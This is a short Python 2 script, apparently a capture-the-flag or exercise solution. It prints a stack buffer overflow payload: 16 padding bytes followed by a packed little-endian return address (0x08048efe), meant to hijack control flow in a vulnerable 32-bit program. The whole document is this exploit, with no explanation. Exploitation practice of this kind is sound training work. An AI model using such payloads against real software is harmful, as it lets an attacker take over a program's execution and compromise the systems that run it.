from struct import pack

retadd = 0x08048efe
s = "A" * 16
print s + str(pack("<I", retadd))